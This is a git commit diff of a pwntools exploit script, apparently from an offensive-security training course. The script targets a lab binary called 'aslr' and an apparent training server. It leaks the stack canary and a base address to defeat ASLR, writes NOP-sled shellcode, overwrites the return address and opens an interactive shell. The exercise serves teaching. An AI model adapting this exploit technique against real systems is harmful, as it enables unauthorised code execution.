cb743c651b32297e5bc861af1953f4684f12e8fa
gio-del <giovanni.delucia@polimi.it>
2023-10-02 20:53:31 +0200

    gonna_leak and aslr

--- mitigations/aslr/script.py
+++ mitigations/aslr/script.py
@@ -6,18 +6,18 @@ context.arch = 'amd64'
 
 if(len(sys.argv) > 1):
 	if(sys.argv[1] == '--debug'):
-		p = process("./gonna_leak")
+		p = process("./aslr")
 		gdb.attach(p, """
-		b *main+203
+		b *main+336
 		call (long)mprotect(0x000000404000, 0x1000, 0x7)
 		"""	)
 		input("wait...")
 	elif(sys.argv[1] == '--strace'):
-		p = process(["strace", "./gonna_leak"])
+		p = process(["strace", "./aslr"])
 	elif(sys.argv[1] == '--remote'):
-		p = remote("bin.training.offdef.it", 2011)
+		p = remote("bin.training.offdef.it", 2012)
 else:
-	p = process("./gonna_leak")
+	p = process("./aslr")
 
 cyclic = cyclic_gen()
 
@@ -34,6 +34,9 @@ syscall
 
 sh = asm(asm_code)
 
+p.send(b'\x90' * (100-len(sh)) + sh)
+
+input("send second input")
 p.send(cyclic.get(105))
 p.recvuntil(b'aaazaabb')
 
@@ -41,18 +44,20 @@ canary = b"\x00" + p.recv(7)
 print('canary: %#x' % u64(canary))
 print('len(canary) = ', len(canary))
 
-input("send second input")
-p.send(b'A' * 150 + b'BB')
+input("send third input")
+p.send(b'A' * 184 + b'BB')
 p.recvuntil(b'BB')
-addr = p.recv(6) + b'\x00' * 2
-stack = u64(addr) - 350
-print('addr: %#x' % stack)
+
+base = p.recv(4)
+print('base addr: %#x' % u64(b'\x00'*4 + base))
+addr = b'\x00' * 2 + base + b'\x00' * 2
+code_pos = u64(addr) + 0x201080
+print('addr: %#x' % code_pos)
 print('len(addr) = ', len(addr))
 
-
-input("send third input")
-p.send(b'\x90'*(104-len(sh)) + sh + canary + b'A'*8 + p64(stack))
 input("send fourth input")
+p.send(b'A'*104 + canary + b'A'*8 + p64(code_pos))
+sleep(0.1)
 p.sendline()
 
 p.interactive()
